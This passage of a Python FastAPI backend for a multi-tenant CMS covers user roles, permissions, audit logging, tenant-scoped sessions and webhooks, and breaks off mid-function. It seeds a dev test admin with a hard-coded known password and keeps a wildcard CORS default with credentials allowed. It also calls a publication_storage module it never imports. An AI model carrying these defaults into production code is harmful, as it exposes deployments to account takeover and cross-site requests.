from fastapi import FastAPI, Depends, HTTPException, Request, Response, UploadFile, File, Form, Query
from fastapi.middleware.cors import CORSMiddleware
from sqlalchemy.orm import Session
from sqlalchemy import Table, MetaData, insert, select, update, delete, text, String, func
from typing import List
import io

import models, schemas
import supabase_admin
import media_storage
import media_cleanup
import aggregation      # M8.5 F1: motor de agregação puro
import audit            # M9 F1: trilha de auditoria (vocabulário + helper)
import api_keys         # M9 F2: token/escopo de API key (módulo puro)
import rate_limit       # M9 F2: token bucket por key
import webhooks         # M9 F3: payload, assinatura e envio seguro
import webhook_crypto   # M9 F3: encrypt-at-rest do segredo de assinatura
import webhook_drain    # M9 F3: drenador da outbox (claim em 2 fases)
import chart_svg        # M8.5 F2: renderizador SVG puro (sem browser)
from database import engine, get_db, is_postgres
from dynamic_schema import (
    create_physical_table,
    add_physical_column,
    drop_physical_column,
    drop_physical_table,
    canonical_data_type,
    ordem_estavel,
)
from tenant_context import (
    resolve_tenant_id,
    set_tenant_for_session,
    tenant_table_prefix,
)
from auth import (
    auth_router, create_master_account,
    get_current_active_user, get_current_admin, get_current_master,
    get_password_hash,
    Principal, get_principal,   # M9 F2: humano ou API key, mesmo header
)

import os
import logging
from fastapi.responses import JSONResponse

# M-Ops F1: o backend rodava mudo (zero `import logging` em backend/*.py).
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(name)s %(message)s",
)
logger = logging.getLogger("atlas")

# Error tracking (M-Ops F1): Sentry só inicializa se SENTRY_DSN estiver setado —
# sem DSN é no-op (nem importa o pacote). Instrumentação de FastAPI/Starlette é
# automática no sentry-sdk 2.x.
_sentry_dsn = os.environ.get("SENTRY_DSN", "").strip()
if _sentry_dsn:
    import sentry_sdk
    sentry_sdk.init(dsn=_sentry_dsn, traces_sample_rate=0.0, send_default_pii=False)
    logger.info("Sentry inicializado")


def _should_seed_test_admin(skip_seed, postgres: bool, enable_seed) -> bool:
    """Seed do testadmin (senha conhecida) só em dev local. Pura, pra teste.

    - SKIP_TEST_SEED setado (conftest do pytest) → nunca.
    - postgres (prod) → só se ENABLE_TEST_SEED setado.
    - sqlite (dev local) → sim (os e2e do front logam como testadmin).
    """
    if skip_seed:
        return False
    return (not postgres) or bool(enable_seed)


app = FastAPI(title="Dynamic CMS API")


@app.exception_handler(Exception)
async def unhandled_exception_handler(request: Request, exc: Exception):
    """M-Ops F1: nada de erro silencioso. Loga com traceback e devolve 500
    limpo (sem vazar stack pro cliente). HTTPException tem handler próprio do
    FastAPI e NÃO passa por aqui — só exceções de fato não tratadas."""
    logger.exception("erro não tratado em %s %s", request.method, request.url.path)
    return JSONResponse(status_code=500, content={"detail": "Internal server error"})

@app.on_event("startup")
def _startup_rate_limit_report():
    rate_limit.startup_report()


@app.on_event("startup")
def _startup_reserved_names():
    """M9 F4: fecha a lista de reservados só quando o app está montado."""
    global RESERVED_TABLE_NAMES
    RESERVED_TABLE_NAMES = _compute_reserved_table_names()
    logger.info("nomes de tabela reservados (computados das rotas): %s",
                ", ".join(RESERVED_TABLE_NAMES))


@app.on_event("startup")
def _startup_cors_check():
    """M9 F4: `CORS_ORIGINS` vazio significa `*` — e com `allow_credentials`
    isso é permissivo demais pra produção.

    **Avisa, não fecha.** Fechar por conta própria derrubaria o frontend de uma
    prod que hoje depende do default — quebrar o site pra corrigir configuração
    é pior que a configuração errada. O aviso é o que transforma isso em
    decisão consciente em vez de descuido silencioso.
    """
    if is_postgres() and not os.environ.get("CORS_ORIGINS", "").strip():
        logger.warning(
            "CORS_ORIGINS vazio em producao: origem `*` com allow_credentials=True. "
            "Setar a lista real de origens do frontend fecha o wildcard."
        )


@app.on_event("startup")
def startup_event():
    logger.info("Atlas backend iniciando (postgres=%s)", is_postgres())
    # Schema é gerenciado por Alembic — `alembic upgrade head` antes do deploy.
    # `Base.metadata.create_all` continua sendo usado pelo conftest dos testes
    # (in-memory SQLite isolado por teste), mas não roda no runtime do app.
    # Seed master account
    db_seed = next(get_db())
    try:
        create_master_account(db_seed)
        # Clean up old master account if it exists
        _old_master = db_seed.query(models.User).filter(models.User.username == "monochaco").first()
        if _old_master:
            db_seed.delete(_old_master)
            db_seed.commit()
        # Seed test admin account for automated frontend tests.
        # Skipped when SKIP_TEST_SEED=1 (set by backend pytest conftest) so that
        # the backend test suite can create its own `testadmin` without collision.
        import os as _os
        # Seed do testadmin (senha conhecida) SÓ em dev local (sqlite). NUNCA em
        # prod (postgres) a menos que ENABLE_TEST_SEED esteja setado — antes
        # seedava em prod sempre que SKIP_TEST_SEED não estivesse setado (vuln:
        # admin de senha conhecida em produção).
        _seed_testadmin = _should_seed_test_admin(
            _os.environ.get("SKIP_TEST_SEED"), is_postgres(), _os.environ.get("ENABLE_TEST_SEED"),
        )
        if _seed_testadmin:
            _test_admin = db_seed.query(models.User).filter(models.User.username == "testadmin").first()
            if not _test_admin:
                _master = db_seed.query(models.User).filter(models.User.role == "master").first()
                _new_admin = models.User(
                    username="testadmin",
                    password_hash=get_password_hash("TestAdmin123!"),
                    role="admin",
                    parent_id=_master.id if _master else None,
                )
                db_seed.add(_new_admin)
                db_seed.commit()
    finally:
        db_seed.close()
    # M8 F1: bucket de mídia provisionado em código (idempotente; no-op sem
    # Supabase e nunca relança) — o de snapshots era manual no dashboard.
    media_storage.ensure_bucket()

# CORS (M-Ops F4): configurável por env. Default mantém ["*"] pra NÃO quebrar
# nada hoje; em prod, setar CORS_ORIGINS (lista separada por vírgula) fecha o
# wildcard — `*` + allow_credentials é o smell (o Starlette ecoa a origin de
# volta, então qualquer site faz request credenciado).
_cors_raw = os.environ.get("CORS_ORIGINS", "").strip()
_cors_origins = [o.strip() for o in _cors_raw.split(",") if o.strip()] if _cors_raw else ["*"]
app.add_middleware(
    CORSMiddleware,
    allow_origins=_cors_origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ==========================================
# Auth Routes
# ==========================================
app.include_router(auth_router, prefix="/api/auth", tags=["auth"])

@app.get("/")
def read_root():
    return {"message": "Welcome to Dynamic CMS API"}


@app.get("/health")
def health(db: Session = Depends(get_db)):
    """M-Ops F1: health check que TOCA o banco. GET / respondeu 200 durante o
    incidente de 2026-06-11 com o Supabase pausado — mentiu pra qualquer
    monitor. Uptime alert e keep-alive devem apontar PRA CÁ, não pra GET /."""
    try:
        db.execute(text("SELECT 1"))
        return {"status": "ok", "db": "ok"}
    except Exception as e:
        logger.error("health check falhou — banco inacessível: %s", e)
        raise HTTPException(status_code=503, detail="database unavailable")

@app.get("/api/auth/me")
def get_current_user_info(current_user: models.User = Depends(get_current_active_user)):
    """Return current authenticated user with workspace fields (with fallback defaults)."""
    from auth import _user_dict
    return _user_dict(current_user)

# ==========================================
# Master-Only: Admin Management
# ==========================================

@app.post("/api/admins", response_model=schemas.UserResponse)
def create_admin(user_data: schemas.UserCreate, db: Session = Depends(get_db), master: models.User = Depends(get_current_master)):
    if db.query(models.User).filter(models.User.username == user_data.username).first():
        raise HTTPException(status_code=400, detail="Username already exists")

    # M4: provisiona em auth.users via Admin API primeiro, depois grava
    # em public.users. Em dev/SQLite (Supabase não configurado) pula —
    # supabase_uid fica NULL.
    sup_uid = None
    if supabase_admin.is_configured():
        try:
            sup_uid = supabase_admin.provision_user(
                username=user_data.username,
                password=user_data.password,
                role="admin",
            )
        except Exception as exc:
            raise HTTPException(status_code=400, detail=f"Supabase Auth error: {exc}")

    new_admin = models.User(
        username=user_data.username,
        password_hash=get_password_hash(user_data.password),
        role="admin",
        parent_id=master.id,
        supabase_uid=sup_uid,
    )
    db.add(new_admin)
    try:
        db.commit()
        db.refresh(new_admin)
    except Exception:
        db.rollback()
        # Compensação: limpa o user no Supabase pra não ficar órfão.
        if sup_uid:
            supabase_admin.delete_user(sup_uid)
        raise

    # M4: backfill do app_metadata.tenant_id (precisa do id local recém criado).
    #
    # B11: este PATCH roda DEPOIS do commit, e antes ficava fora de qualquer
    # compensação. Quando ele falhava, o master levava 500 mas o admin já
    # existia em `public.users` E em `auth.users` — sem `tenant_id` no
    # `app_metadata`, e sem ninguém desfazer. Hoje isso é invisível porque
    # nenhum código do backend lê esse claim (o tenant sai do banco local);
    # vira falha silenciosa no dia em que algo o ler — o M10 leria.
    #
    # Compensar do mesmo jeito do bloco acima (apagar o user do Supabase e a
    # linha local) é o que mantém a promessa: ou o admin nasce inteiro, ou não
    # nasce.
    #
    # O `ensure_tenant_schema` (logo abaixo) fica DE FORA da compensação, e de
    # propósito: ele roda depois deste bloco, então quando a compensação
    # dispara o schema ainda não existe. Se ele próprio falhar, o admin fica
    # sem schema — e isso se autocura na primeira tabela criada, porque o
    # `create_physical_table` chama `ensure_tenant_schema` de novo. É gap
    # conhecido e barato, não esquecimento.
    if sup_uid:
        try:
            supabase_admin.update_user_metadata(sup_uid, role="admin", tenant_id=new_admin.id)
        except Exception as exc:
            logger.exception("backfill de app_metadata falhou para admin %s — desfazendo",
                             new_admin.id)
            try:
                db.delete(new_admin)
                db.commit()
            except Exception:
                db.rollback()
                logger.exception("rollback local do admin %s TAMBEM falhou", new_admin.id)
            supabase_admin.delete_user(sup_uid)
            raise HTTPException(
                status_code=502,
                detail=f"Falha ao provisionar metadados do admin no Supabase: {exc}",
            )

    # M3 Fase 3: provisiona o schema tenant_N em Postgres (no-op em SQLite).
    from dynamic_schema import ensure_tenant_schema
    ensure_tenant_schema(new_admin.id)

    return new_admin

@app.get("/api/admins", response_model=List[schemas.UserResponse])
def list_admins(db: Session = Depends(get_db), master: models.User = Depends(get_current_master)):
    return db.query(models.User).filter(models.User.role == "admin").all()

_RESERVED_SLUGS = {
    "api", "admin", "auth", "login", "master", "public", "static",
    "assets", "explore", "dashboard", "workspace", "atlas", "mora",
}

@app.patch("/api/admins/me/workspace")
def update_workspace(
    body: schemas.WorkspaceUpdate,
    db: Session = Depends(get_db),
    current_user: models.User = Depends(get_current_active_user),
):
    """Admin updates their own workspace editorial name and slug."""
    if current_user.role == "master":
        raise HTTPException(status_code=403, detail="Master account does not have a workspace")
    if body.workspace_slug in _RESERVED_SLUGS:
        raise HTTPException(status_code=400, detail=f"Slug '{body.workspace_slug}' is reserved")
    conflict = db.query(models.User).filter(
        models.User.workspace_slug == body.workspace_slug,
        models.User.id != current_user.id,
    ).first()
    if conflict:
        raise HTTPException(status_code=409, detail="Slug already taken")
    _old_slug = current_user.workspace_slug
    current_user.workspace_name = body.workspace_name.strip()
    current_user.workspace_slug = body.workspace_slug
    # M9 F1: handler de um commit só → o audit entra NA MESMA transação (pode
    # levantar; aborta junto, que é o certo aqui). Trocar o slug muda a URL
    # pública do workspace: é mudança de endereço, não de cosmético.
    audit.record(
        db, owner_id=current_user.id, actor=audit.user_actor(current_user),
        action=audit.WORKSPACE_UPDATE, target_type=audit.T_WORKSPACE,
        target_id=current_user.id, target_label=current_user.workspace_name,
        changed_columns=["workspace_name", "workspace_slug"],
        details={"slug_from": _old_slug, "slug_to": body.workspace_slug},
    )
    db.commit()
    db.refresh(current_user)
    from auth import _user_dict
    return _user_dict(current_user)

@app.delete("/api/admins/{admin_id}")
def delete_admin(admin_id: int, db: Session = Depends(get_db), master: models.User = Depends(get_current_master)):
    admin = db.query(models.User).filter(models.User.id == admin_id, models.User.role == "admin").first()
    if not admin:
        raise HTTPException(status_code=404, detail="Admin not found")
    
    sup_uid = admin.supabase_uid
    owner_id = admin.id

    # 1. Delete dependent moderators and their Supabase auth records
    mods = db.query(models.User).filter(models.User.parent_id == admin.id).all()
    mod_uids = []
    for mod in mods:
        if mod.supabase_uid:
            mod_uids.append(mod.supabase_uid)
        db.delete(mod)

    # 2. Drop the tenant schema (PG) ou as físicas t{id}_* (SQLite) — senão
    #    ficam tabelas zumbi órfãs. Em SQLite não há schema pra CASCADE; o gap
    #    foi achado no detalhamento da F0 (M8).
    if is_postgres():
        from tenant_context import tenant_schema_name
        schema = tenant_schema_name(admin.id)
        db.execute(text(f'DROP SCHEMA IF EXISTS "{schema}" CASCADE'))
    else:
        # nome físico determinístico t{id}_{name} (physical_name é não-confiável
        # em SQLite). Captura ANTES do delete cascatear as linhas de _tables.
        admin_tables = db.query(models.DynamicTable).filter(
            models.DynamicTable.owner_id == admin.id
        ).all()
        for t in admin_tables:
            db.execute(text(f'DROP TABLE IF EXISTS "t{admin.id}_{t.name}"'))

    # M8 F1: rows de `_assets` do owner saem explícito PRÉ-commit (SQLite não
    # cascateia FK ondelete sem PRAGMA foreign_keys); paths capturados pro
    # cleanup dos blobs PÓS-commit.
    asset_paths = [
        a.path for a in db.query(models.Asset).filter(models.Asset.owner_id == owner_id).all()
    ]
    db.query(models.Asset).filter(models.Asset.owner_id == owner_id).delete(synchronize_session=False)

    # M9 F1 (decisão D3 — a trilha MORRE COM O TENANT): companion delete
    # explícito, mesmo motivo do `_assets` acima. O `ondelete=CASCADE` da FK só
    # age em Postgres; em SQLite a trilha sobreviveria ao dono e ficaria órfã
    # apontando pra um usuário que não existe mais.
    #
    # Gap conhecido e aceito: o evento "o master apagou este admin" cai junto —
    # não há mais trilha onde escrevê-lo. Vai pro logger `atlas`, que é o único
    # lugar que sobrevive ao próprio tenant.
    purged = audit.purge_for_owner(db, owner_id)
    logger.info("delete_admin: tenant=%s trilha_apagada=%s por=%s",
                owner_id, purged, master.username)

    db.delete(admin)
    db.commit()

    # Cleanups externos vão *depois* do commit local — se falharem, o banco
    # já está consistente. Nunca propagam 500.

    # 3. Snapshots no Storage (cascade do Postgres só limpa
    #    `_publication_versions`, não os blobs do bucket).
    publication_storage.delete_owner_snapshots(owner_id)

    # 3a. Cópias de mídia congeladas nos snapshots (M8 F3 #3=A) — todas as
    #     versões do owner, por prefixo `{owner}/pub/`. Never-raise.
    media_storage.remove_pub_media(owner_id)

    # 3b. Blobs de mídia (M8 F1) — dirigido por `_assets` (paths capturados
    #     acima), não por list() do Storage. Never-raise.
    media_storage.remove(asset_paths)

    # 4. Supabase Auth. Falha aqui = órfão em auth.users, recuperável via
    #    janitor; reportado no body em vez de quebrar o cliente.
    orphans = []
    if supabase_admin.is_configured():
        for uid in ([sup_uid] if sup_uid else []) + mod_uids:
            try:
                supabase_admin.delete_user(uid)
            except Exception as exc:
                orphans.append({"uid": uid, "error": str(exc)})

    resp = {"message": "Admin deleted"}
    if orphans:
        resp["supabase_auth_orphans"] = orphans
    return resp

@app.get("/api/all-users", response_model=List[schemas.UserResponse])
def list_all_users(db: Session = Depends(get_db), master: models.User = Depends(get_current_master)):
    """Master can see all users"""
    return db.query(models.User).filter(models.User.role != "master").all()

# ==========================================
# Admin: Moderator Management
# ==========================================

@app.post("/api/moderators", response_model=schemas.UserResponse)
def create_moderator(user_data: schemas.UserCreate, db: Session = Depends(get_db), admin: models.User = Depends(get_current_admin)):
    if admin.role == "master":
        raise HTTPException(status_code=403, detail="Use /api/admins to create admins. Moderators are created by admins.")
    if db.query(models.User).filter(models.User.username == user_data.username).first():
        raise HTTPException(status_code=400, detail="Username already exists")

    # M4: provisiona em auth.users com tenant_id = admin.id (mod herda
    # tenant do admin pai). app_metadata vai direto pro JWT.
    sup_uid = None
    if supabase_admin.is_configured():
        try:
            sup_uid = supabase_admin.provision_user(
                username=user_data.username,
                password=user_data.password,
                role="moderator",
                tenant_id=admin.id,
            )
        except Exception as exc:
            raise HTTPException(status_code=400, detail=f"Supabase Auth error: {exc}")

    new_mod = models.User(
        username=user_data.username,
        password_hash=get_password_hash(user_data.password),
        role="moderator",
        parent_id=admin.id,
        supabase_uid=sup_uid,
    )
    db.add(new_mod)
    try:
        # M9 F1: precisa do id do mod pro alvo, e o INSERT tem que estar na mesma
        # transação — `flush` dá o id sem commitar, e o audit entra logo depois.
        db.flush()
        audit.record(
            db, owner_id=admin.id, actor=audit.user_actor(admin),
            action=audit.MODERATOR_CREATE, target_type=audit.T_USER,
            target_id=new_mod.id, target_label=new_mod.username,
        )
        db.commit()
        db.refresh(new_mod)
    except Exception:
        db.rollback()
        if sup_uid:
            supabase_admin.delete_user(sup_uid)
        raise
    return new_mod

@app.get("/api/moderators", response_model=List[schemas.UserResponse])
def list_moderators(db: Session = Depends(get_db), admin: models.User = Depends(get_current_admin)):
    if admin.role == "master":
        return db.query(models.User).filter(models.User.role == "moderator").all()
    return db.query(models.User).filter(models.User.parent_id == admin.id, models.User.role == "moderator").all()

@app.delete("/api/moderators/{mod_id}")
def delete_moderator(mod_id: int, db: Session = Depends(get_db), admin: models.User = Depends(get_current_admin)):
    mod = db.query(models.User).filter(models.User.id == mod_id, models.User.role == "moderator").first()
    if not mod:
        raise HTTPException(status_code=404, detail="Moderator not found")
    if admin.role != "master" and mod.parent_id != admin.id:
        raise HTTPException(status_code=403, detail="Not your moderator")
    sup_uid = mod.supabase_uid
    # M9 F1: identidade capturada antes do delete (o objeto some da sessão).
    # A trilha é do TENANT (`mod.parent_id`), não de quem apagou — o master
    # pode apagar mod de qualquer admin, e o evento tem que aparecer pro dono.
    _mod_id, _mod_name, _tenant = mod.id, mod.username, mod.parent_id
    db.delete(mod)
    audit.record(
        db, owner_id=_tenant, actor=audit.user_actor(admin),
        action=audit.MODERATOR_DELETE, target_type=audit.T_USER,
        target_id=_mod_id, target_label=_mod_name,
    )
    db.commit()
    if sup_uid and supabase_admin.is_configured():
        supabase_admin.delete_user(sup_uid)
    return {"message": "Moderator deleted"}

@app.post("/api/moderators/{mod_id}/reset-password")
def reset_moderator_password(mod_id: int, body: schemas.PasswordReset, db: Session = Depends(get_db), admin: models.User = Depends(get_current_admin)):
    mod = db.query(models.User).filter(models.User.id == mod_id, models.User.role == "moderator").first()
    if not mod:
        raise HTTPException(status_code=404, detail="Moderator not found")
    if admin.role != "master" and mod.parent_id != admin.id:
        raise HTTPException(status_code=403, detail="Not your moderator")
    mod.password_hash = get_password_hash(body.new_password)
    # M9 F1: o evento de maior valor forense do plano de acesso. `details` diz
    # QUE a senha mudou; a senha (nem o hash) nunca entra na trilha.
    audit.record(
        db, owner_id=mod.parent_id, actor=audit.user_actor(admin),
        action=audit.MODERATOR_PASSWORD_RESET, target_type=audit.T_USER,
        target_id=mod.id, target_label=mod.username,
    )
    db.commit()
    return {"message": "Password reset successfully"}

# ==========================================
# Admin: Database Group Management
# ==========================================

@app.post("/api/database-groups", response_model=schemas.DatabaseGroupResponse)
def create_database_group(group: schemas.DatabaseGroupCreate, db: Session = Depends(get_db), admin: models.User = Depends(get_current_admin)):
    if admin.role == "master":
        raise HTTPException(status_code=403, detail="Master cannot own database groups. Create an admin first.")
    new_group = models.DatabaseGroup(
        name=group.name,
        description=group.description,
        admin_id=admin.id
    )
    db.add(new_group)
    db.flush()
    audit.record(
        db, owner_id=admin.id, actor=audit.user_actor(admin),
        action=audit.GROUP_CREATE, target_type=audit.T_GROUP,
        target_id=new_group.id, target_label=new_group.name,
    )
    db.commit()
    db.refresh(new_group)
    return new_group

@app.get("/api/database-groups", response_model=List[schemas.DatabaseGroupResponse])
def list_database_groups(db: Session = Depends(get_db), user: models.User = Depends(get_current_active_user)):
    if user.role == "master":
        return db.query(models.DatabaseGroup).all()
    elif user.role == "admin":
        return db.query(models.DatabaseGroup).filter(models.DatabaseGroup.admin_id == user.id).all()
    else:
        # Moderator: only groups they have permission to
        perm_groups = db.query(models.ModeratorPermission.database_group_id).filter(
            models.ModeratorPermission.moderator_id == user.id
        ).subquery()
        return db.query(models.DatabaseGroup).filter(models.DatabaseGroup.id.in_(perm_groups)).all()

@app.delete("/api/database-groups/{group_id}")
def delete_database_group(group_id: int, db: Session = Depends(get_db), admin: models.User = Depends(get_current_admin)):
    group = db.query(models.DatabaseGroup).filter(models.DatabaseGroup.id == group_id).first()
    if not group:
        raise HTTPException(status_code=404, detail="Group not found")
    if admin.role != "master" and group.admin_id != admin.id:
        raise HTTPException(status_code=403, detail="Not your group")
    _gid, _gname, _gowner = group.id, group.name, group.admin_id
    db.delete(group)
    audit.record(
        db, owner_id=_gowner, actor=audit.user_actor(admin),
        action=audit.GROUP_DELETE, target_type=audit.T_GROUP,
        target_id=_gid, target_label=_gname,
    )
    db.commit()
    return {"message": "Database group deleted"}

# ==========================================
# Admin: Permission Management
# ==========================================

@app.post("/api/database-groups/{group_id}/permissions", response_model=schemas.PermissionResponse)
def grant_permission(group_id: int, perm: schemas.PermissionCreate, db: Session = Depends(get_db), admin: models.User = Depends(get_current_admin)):
    group = db.query(models.DatabaseGroup).filter(models.DatabaseGroup.id == group_id).first()
    if not group:
        raise HTTPException(status_code=404, detail="Group not found")
    if admin.role != "master" and group.admin_id != admin.id:
        raise HTTPException(status_code=403, detail="Not your group")
    
    # Verify the moderator exists and belongs to this admin
    mod = db.query(models.User).filter(models.User.id == perm.moderator_id, models.User.role == "moderator").first()
    if not mod:
        raise HTTPException(status_code=404, detail="Moderator not found")
    if admin.role != "master" and mod.parent_id != admin.id:
        raise HTTPException(status_code=403, detail="Not your moderator")
    
    # Check if already exists
    existing = db.query(models.ModeratorPermission).filter(
        models.ModeratorPermission.moderator_id == perm.moderator_id,
        models.ModeratorPermission.database_group_id == group_id
    ).first()
    if existing:
        raise HTTPException(status_code=400, detail="Permission already exists")
    
    new_perm = models.ModeratorPermission(moderator_id=perm.moderator_id, database_group_id=group_id)
    db.add(new_perm)
    db.flush()
    # Dar acesso a um moderador é mudança de superfície de quem enxerga o quê —
    # o alvo é a PERMISSÃO, e o rótulo diz quem ganhou acesso a quê.
    audit.record(
        db, owner_id=group.admin_id, actor=audit.user_actor(admin),
        action=audit.PERMISSION_GRANT, target_type=audit.T_PERMISSION,
        target_id=new_perm.id, target_label=f"{mod.username} → {group.name}",
        details={"moderator_id": mod.id, "group_id": group.id},
    )
    db.commit()
    db.refresh(new_perm)
    return new_perm

@app.delete("/api/database-groups/{group_id}/permissions/{mod_id}")
def revoke_permission(group_id: int, mod_id: int, db: Session = Depends(get_db), admin: models.User = Depends(get_current_admin)):
    # B7: o grupo é resolvido e CHECADO antes de tocar na permissão. Sem isso,
    # este handler achava a permissão só por (group_id, mod_id) e apagava — um
    # admin de outro tenant que soubesse os dois ids revogava acesso alheio.
    # Mesma classe do gap de `/api/relations` que o M-Ops fechou, e os irmãos
    # (`grant_permission`, `delete_database_group`) já checavam.
    #
    # A ordem importa: a checagem vem ANTES da busca da permissão, senão o 404
    # ainda contaria se existe ou não permissão no tenant do vizinho.
    group = db.query(models.DatabaseGroup).filter(models.DatabaseGroup.id == group_id).first()
    if not group:
        raise HTTPException(status_code=404, detail="Group not found")
    if admin.role != "master" and group.admin_id != admin.id:
        raise HTTPException(status_code=403, detail="Not your group")

    perm = db.query(models.ModeratorPermission).filter(
        models.ModeratorPermission.database_group_id == group_id,
        models.ModeratorPermission.moderator_id == mod_id
    ).first()
    if not perm:
        raise HTTPException(status_code=404, detail="Permission not found")
    _pid, _mid = perm.id, perm.moderator_id
    db.delete(perm)
    # O grupo agora é garantido (checado acima), então o dono da trilha é certo.
    audit.record(
        db, owner_id=group.admin_id, actor=audit.user_actor(admin),
        action=audit.PERMISSION_REVOKE, target_type=audit.T_PERMISSION,
        target_id=_pid, target_label=group.name,
        details={"moderator_id": _mid, "group_id": group_id},
    )
    db.commit()
    return {"message": "Permission revoked"}

# ==========================================
# Helper: get accessible owner_id for tenant prefix
# ==========================================

# DEPRECATED: shim durante a migração M3. Remover na Fase 8.
def get_tenant_prefix(user: models.User, db: Session = None) -> str:
    """Prefixo legado para nomes físicos de tabelas dinâmicas no SQLite."""
    tid = resolve_tenant_id(user)
    if tid is None:
        return "master_"  # master sem contexto fixo
    return tenant_table_prefix(tid)

def get_accessible_tables(user: models.User, db: Session):
    """Get tables accessible to the current user based on role and permissions."""
    if user.role == "master":
        return db.query(models.DynamicTable).all()
    elif user.role == "admin":
        return db.query(models.DynamicTable).filter(models.DynamicTable.owner_id == user.id).all()
    else:
        # Moderator: only tables in permitted groups
        perm_groups = db.query(models.ModeratorPermission.database_group_id).filter(
            models.ModeratorPermission.moderator_id == user.id
        ).subquery()
        return db.query(models.DynamicTable).filter(models.DynamicTable.group_id.in_(perm_groups)).all()


# ==========================================
# Tenant-aware DB dependencies (M3 Fase 4)
# ==========================================

def tenant_db(
    current_user: models.User = Depends(get_current_active_user),
    db: Session = Depends(get_db),
):
    """Session com `app.tenant_id` setado em Postgres (no-op em SQLite).

    Faz commit/rollback do request inteiro e libera o GUC com RESET ALL
    antes de devolver a conexão ao pool. Endpoints que usam essa
    dependency NÃO devem chamar `db.commit()` — a dependency cuida.
    """
    tid = resolve_tenant_id(current_user)
    try:
        set_tenant_for_session(db, tid)
        yield db
        db.commit()
    except Exception:
        db.rollback()
        raise
    finally:
        if db.bind is not None and db.bind.dialect.name == "postgresql":
            try:
                db.execute(text("RESET ALL"))
            except Exception:
                pass


def tenant_db_principal(
    principal: Principal = Depends(get_principal),
    db: Session = Depends(get_db),
):
    """M9 F2 — gêmeo key-aware do `tenant_db`, só nas rotas que a key alcança.

    **Replica o ciclo do GUC porque isso não é opcional**: sob FORCE RLS em
    Postgres, uma sessão sem `app.tenant_id` setado devolve **zero linhas sem
    erro** — o pior tipo de bug, um 200 vazio que parece "não tem dado". E o
    `RESET ALL` no finally é o que impede a conexão de voltar pro pool
    carregando o tenant de quem usou antes.

    O `resolve_tenant_id` recebe o **dono** (`principal.user`), não a key: é o
    que mantém `get_accessible_tables` e todo o resto sem saber que key existe.
    O que a key restringe é aplicado por cima, pelo escopo.

    Rate limit entra aqui, por key, ANTES de tocar o banco.
    """
    if principal.is_key:
        if not rate_limit.limiter.allow(principal.key.prefix):
            raise HTTPException(
                status_code=429,
                detail="Limite de requisições da API key excedido. Tente de novo em instantes.",
                headers={"Retry-After": "10"},
            )
    tid = resolve_tenant_id(principal.user)
    try:
        set_tenant_for_session(db, tid)
        yield db
        db.commit()
    except Exception:
        db.rollback()
        raise
    finally:
        if db.bind is not None and db.bind.dialect.name == "postgresql":
            try:
                db.execute(text("RESET ALL"))
            except Exception:
                pass


def _webhook_targets(db: Session, owner_id: int, event: str, table_name: str):
    """Endpoints ativos deste workspace inscritos NESTE evento e nesta tabela.

    Consultado ANTES de montar payload: sem ninguém escutando, o emit não paga
    o re-SELECT da linha nem serializa nada.
    """
    if not owner_id:
        return []
    eps = db.query(models.WebhookEndpoint).filter(
        models.WebhookEndpoint.owner_id == owner_id,
        models.WebhookEndpoint.is_active == True,  # noqa: E712
    ).all()
    alvos = []
    for ep in eps:
        if not webhooks.matches(ep.events, event):
            continue
        # `table_names` NULL = todas; lista = só essas.
        if ep.table_names and table_name not in ep.table_names:
            continue
        alvos.append(ep)
    return alvos


def emit_webhook(db: Session, *, owner_id: int, event: str, table_name: str,
                 pk=None, row: dict | None = None, row_factory=None,
                 actor: audit.Actor = None, extra: dict | None = None) -> int:
    """Grava a entrega na OUTBOX, na MESMA transação da mutação (decisão #3).

    É isso que torna a durabilidade real em vez de promessa: se o dado commitou,
    a entrega existe; se deu rollback, não sobra entrega fantasma de uma escrita
    que não aconteceu. **Nenhum HTTP acontece aqui** — segurar uma conexão do
    pool através de um `requests.post` de 10s estoura o pool 5+10 com um único
    receptor lento.

    O corpo é serializado UMA vez e guardado como TEXT: é exatamente esse texto
    que será assinado e enviado. Re-serializar no drain poderia reordenar chaves
    e quebrar a assinatura no receptor.
    """
    alvos = _webhook_targets(db, owner_id, event, table_name)
    if not alvos:
        return 0

    # `row_factory` só é chamado quando há alguém escutando: sem isso, todo
    # INSERT/UPDATE pagaria um SELECT extra pra montar um payload que ninguém
    # ia receber.
    if row is None and row_factory is not None:
        row = row_factory()

    quando = _dt_now_utc()
    ator = {"type": actor.type, "id": actor.id, "label": actor.label} if actor else None
    n = 0
    for ep in alvos:
        did = webhooks.new_delivery_id()
        corpo = webhooks.canonical_body(webhooks.build_payload(
            event=event, table=table_name, pk=pk, row=row, actor=ator,
            occurred_at=quando.isoformat() + "Z", delivery_id=did, extra=extra,
        ))
        db.add(models.WebhookDelivery(
            owner_id=owner_id, endpoint_id=ep.id, delivery_id=did, event=event,
            body=corpo, status="pending", attempts=0, next_attempt_at=quando,
        ))
        n += 1
    return n


def _row_snapshot(db: Session, table, pk_col, record_id) -> dict | None:
    """Relê a linha inteira (decisão G-A). O `PUT` recebe body PARCIAL e o PK
    vem no path — mandar o diff entregaria ao consumidor uma mudança sem
    identidade da linha, e sem os defaults que o banco preencheu."""
    try:
        linha = db.execute(select(table).where(pk_col == record_id)).first()
        return dict(linha._mapping) if linha is not None else None
    except Exception:
        return None


def principal_actor(principal: Principal, request=None) -> audit.Actor:
    """Ator do audit a partir do principal — é aqui que a F2 encaixa no helper
    da F1 sem migration nem mudança de assinatura em nenhum handler.

    O `label` da key inclui o prefixo público: numa investigação, saber que foi
    "sync-zapier (a3f19c22)" é o que permite revogar a key certa.
    """
    if principal.is_key:
        ip = getattr(getattr(request, "client", None), "host", None) if request else None
        ua = request.headers.get("user-agent") if request is not None else None
        return audit.Actor(type="key", id=principal.key.id, label=principal.label,
                           ip=ip, user_agent=ua)
    return audit.user_actor(principal.user, request)


def authorize_table(principal: Principal, table_name: str, mode: str, db: Session):
    """Resolve a tabela pro principal e aplica o escopo da key. Devolve a linha
    de `_tables` ou levanta.

    Ordem deliberada: **acessibilidade primeiro, escopo depois**. Assim uma key
    perguntando por tabela de outro tenant recebe 404 (não existe pra ela), e
    perguntando por tabela do próprio tenant fora do escopo recebe 403 (existe,
    você não pode). Inverter a ordem transformaria o 403 em oráculo: bastaria
    varrer nomes pra descobrir o que o vizinho tem.
    """
    acessiveis = get_accessible_tables(principal.user, db)
    db_table = next((t for t in acessiveis if t.name == table_name), None)
    if not db_table:
        raise HTTPException(status_code=404, detail="Table not found or no access")

    if not principal.is_key:
        return db_table

    if mode == api_keys.WRITE:
